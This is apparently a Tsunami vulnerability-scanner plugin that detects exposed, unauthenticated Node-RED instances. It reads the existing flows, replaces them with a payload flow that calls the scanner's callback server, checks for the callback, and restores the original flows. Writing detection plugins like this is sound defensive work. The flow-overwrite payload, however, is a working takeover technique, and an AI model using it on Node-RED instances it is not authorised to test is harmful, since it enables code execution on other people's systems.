# proto-file: proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "NodeRED_ExposedUI"
  author: "Nicolas Golubovic (ngolubovic@google.com)"
  version: "0.3"
}

finding: {
  main_id: {
    publisher: "GOOGLE"
    value: "NODERED_EXPOSED_UI"
  }
  title: "Exposed Node-RED instance"
  description: "Node-RED instance is exposed and can be used to compromise the system."
  recommendation:
    "Configure authentication or ensure the Node-RED instance is not exposed "
    "to the network. See "
    "https://nodered.org/docs/user-guide/runtime/securing-node-red for details."
  severity: CRITICAL
}

###########
# ACTIONS #
###########

actions: {
  name: "retrieve_existing_flows"
  cleanup_actions: ["restore_flows"]
  http_request: {
    method: GET
    uri: "/flows"
    headers: [
      { name: "Content-Type" value: "application/json; charset=utf-8" }
    ]
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "\"id\":" },
          { body: {} contains: "\"wires\":[[" }
        ]
      }
      extract_all: {
        patterns: { from_body: {} regexp: "(.*)" variable_name: "OLD_FLOWS" }
      }
    }
  }
}

# This action will rewrite the flows. We expect the cleanup action registered on
# the previous action to restore the previously existing flows afterwards.
actions: {
  name: "hijack_flows"
  http_request: {
    method: POST
    uri: "/flows"
    headers: [
      { name: "Content-Type" value: "application/json; charset=utf-8" },
      { name: "Node-RED-Deployment-Type" value: "full" },
      { name: "Node-RED-API-Version" value: "v2" }
    ]
    data: "{{ PAYLOAD }}"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "\"rev\":\"" }
        ]
      }
    }
  }
}

actions: {
  name: "wait_for_interraction"
  utility: { sleep: { duration_ms: 200 } }
}

actions: {
  name: "poll_callback_server"
  callback_server: { action_type: CHECK }
}

actions: {
  name: "restore_flows"
  http_request: {
    method: POST
    uri: "/flows"
    headers: [
      { name: "Content-Type" value: "application/json; charset=utf-8" },
      { name: "Node-RED-Deployment-Type" value: "full" },
      { name: "Node-RED-API-Version" value: "v2" }
    ]
    data: "{\"flows\": {{ OLD_FLOWS }}}"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "\"rev\":\"" }
        ]
      }
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
  condition: REQUIRES_CALLBACK_SERVER
  variables: [
    {
      name: "FLOW_NAME"
      value: "tsunami_security_scan_flow"
    },
    {
      name: "PAYLOAD"
      value: "{\"flows\":[{\"id\":\"f6f2187d.f17ca8\",\"type\":\"tab\",\"label\":\"{{ FLOW_NAME }}\",\"disabled\":false,\"info\":\"\"},{\"id\":\"0c3c71799bee2cb5\",\"type\":\"inject\",\"z\":\"f6f2187d.f17ca8\",\"name\":\"\",\"props\":[{\"p\":\"payload\"},{\"p\":\"topic\",\"vt\":\"str\"}],\"repeat\":\"\",\"crontab\":\"\",\"once\":true,\"onceDelay\":0.1,\"topic\":\"\",\"payload\":\"\",\"payloadType\":\"date\",\"x\":150,\"y\":320,\"wires\":[[\"718fd847ec698bdf\"]]},{\"id\":\"718fd847ec698bdf\",\"type\":\"http request\",\"z\":\"f6f2187d.f17ca8\",\"name\":\"\",\"method\":\"GET\",\"ret\":\"txt\",\"paytoqs\":\"ignore\",\"url\":\"{{ T_CBS_URI }}\",\"tls\":\"\",\"persist\":false,\"proxy\":\"\",\"insecureHTTPParser\":false,\"authType\":\"\",\"senderr\":false,\"headers\":[],\"x\":350,\"y\":340,\"wires\":[[]]}]}"
    }
  ]
  actions: [
    "retrieve_existing_flows",
    "hijack_flows",
    "wait_for_interraction",
    "poll_callback_server"
  ]
}
